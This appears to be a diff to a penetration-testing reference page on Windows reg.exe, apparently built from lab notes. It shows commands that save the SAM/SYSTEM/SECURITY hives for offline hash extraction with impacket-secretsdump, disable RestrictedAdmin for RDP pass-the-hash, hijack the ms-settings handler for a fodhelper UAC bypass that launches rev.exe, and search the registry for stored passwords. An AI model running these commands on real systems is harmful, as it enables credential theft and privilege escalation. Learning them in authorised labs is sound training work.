@@ -9,6 +9,47 @@ hideFooterPagination: true
 
 {/* Generated from Commands/reg.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## reg.exe: choose the operation and read the result
+
+Query the registry or export the SAM/SYSTEM hives for offline parsing.
+
+### What the result establishes
+
+Identify the hive/key and distinguish query, export, save and modification operations.
+
+### Prerequisites and common failures
+
+Reading configuration differs from saving protected hives; elevation and registry view can change what is accessible.
+
+### Example 1: Autologon configuration
+
+Run in: **Windows cmd.exe or PowerShell**.
+
+```text
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+```
+
+### Example 2: Export local account hives
+
+Run in: **Elevated Windows cmd.exe or PowerShell**. C:\Temp must exist; save both hives from the same host.
+
+```text
+reg save HKLM\SAM C:\Temp\SAM
+reg save HKLM\SYSTEM C:\Temp\SYSTEM
+```
+
+### Example 3: Read transferred hives
+
+Run in: **Kali**. Transfer both files to Kali first.
+
+```bash
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+
+## Saved commands and notebook recipes
+
+Query the registry or export the SAM/SYSTEM hives for offline parsing.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=reg) · [All tools](/index)
@@ -62,6 +103,13 @@ C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v Disabl
 Registry Editor showing path: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa. Highlighted entry: DisableRestrictedAdmin, REG_DWORD, value 0.
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — RDP Pass-the-Hash (PtH)](/modules/common-services/full-reference#rdp-pass-the-hash-pth) · [Attacking RDP: Module Notes — Adding the DisableRestrictedAdmin Registry Key](/modules/common-services/rdp#adding-the-disablerestrictedadmin-registry-key)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="High-value Windows locations">
@@ -74,6 +122,13 @@ Registry Editor showing path: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Contro
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Find Credentials on Windows — High-value Windows locations](/password-attacks/credential-hunting-in-windows#high-value-windows-locations)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="RDP — PtH for GUI access (xfreerdp)">
@@ -85,6 +140,13 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Defaul
 ```cmd
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Hash from Linux and Windows — RDP — PtH for GUI access (xfreerdp)](/password-attacks/pass-the-hash#rdp-—-pth-for-gui-access-xfreerdp)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -99,6 +161,13 @@ reg.exe save hklm\sam C:\sam.save
 reg.exe save hklm\system C:\system.save
 reg.exe save hklm\security C:\security.save
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — 11. Attacking SAM, SYSTEM & SECURITY](/password-attacks/password-attacks-cheat-sheet#11-attacking-sam-system-&-security)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -116,6 +185,13 @@ reg save HKLM\SYSTEM C:\Temp\SYSTEM
 :: on Kali:  impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — C. SeBackup / SeRestore → read any file](/cheatsheets/windows-post-exploitation#c-sebackup-/-serestore-→-read-any-file) · [Impacket: Script Quick Reference — Example 5: C. SeBackup / SeRestore → read any file](/tools/impacket#example-5-c-sebackup-/-serestore-→-read-any-file)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="F. UAC bypass (admin but Medium integrity)">
@@ -130,6 +206,13 @@ reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute 
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe /c C:\Temp\rev.exe" /f
 fodhelper.exe
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — F. UAC bypass (admin but Medium integrity)](/cheatsheets/windows-post-exploitation#f-uac-bypass-admin-but-medium-integrity)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -153,6 +236,13 @@ cmdkey /list
 schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — PHASE B — PrivEsc enumeration](/cheatsheets/windows-post-exploitation#phase-b-—-privesc-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="AlwaysInstallElevated">
@@ -166,6 +256,13 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — AlwaysInstallElevated](/privesc/windows-privesc-checklist#alwaysinstallelevated)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Windows Privilege Escalation: Full Checklist**
 
 Context from the notebook: Using the  reg query  command, you can check the status of the  AlwaysInstallElevated  registry key for both the user and the machine. If both queries return a value of  0x1 , then  AlwaysInstallElevated  is enabled for both user and machine, indicating the system is vulnerable.
@@ -173,6 +270,13 @@ Context from the notebook: Using the  reg query  command, you can check the stat
 ```text
 reg query
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — AlwaysInstallElevated](/privesc/windows-privesc-checklist#alwaysinstallelevated)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -186,6 +290,13 @@ reg query
 REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Processes Enumeration and Tasks](/privesc/windows-privesc-checklist#eop-processes-enumeration-and-tasks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Windows Privilege Escalation: Full Checklist**
 
 ```powershell
@@ -196,6 +307,13 @@ reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
 dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
 dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Processes Enumeration and Tasks](/privesc/windows-privesc-checklist#eop-processes-enumeration-and-tasks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -209,6 +327,13 @@ dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
 reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
 Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Network Enumeration](/privesc/windows-privesc-checklist#network-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -233,6 +358,13 @@ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Search the registry for key names and passwords](/privesc/windows-privesc-checklist#search-the-registry-for-key-names-and-passwords)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="The core idea: secrets, not passwords">
@@ -246,6 +378,13 @@ Context from the notebook: SAM  ( HKLM\SAM ) NT hashes of  local  accounts reg s
 ```text
 reg save
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Authentication: NTLM and Kerberos — The core idea: secrets, not passwords](/password-attacks/windows-authentication-ntlm-kerberos#the-core-idea-secrets-not-passwords)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -261,6 +400,13 @@ Context from the notebook: SeBackupPrivilege reg save SAM/SYSTEM  → secretsdum
 reg save SAM/SYSTEM
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — 🧾 QUICK REFERENCE — "I see X → do Y"](/cheatsheets/windows-post-exploitation#-quick-reference-—-i-see-x-→-do-y)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
@@ -269,3 +415,13 @@ reg save SAM/SYSTEM
 
 - [WDigest — plaintext missing](/commands/wdigest)
 - [secretsdump.py](/commands/secretsdump)
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Password Attacks: Cracking, Files, and Credential Stores](/password-attacks/password-attacks-cheat-sheet)
+- [WDigest — plaintext missing](/commands/wdigest)
+- [secretsdump.py](/commands/secretsdump)
+
+{/* VAULT_RELATED_END */}
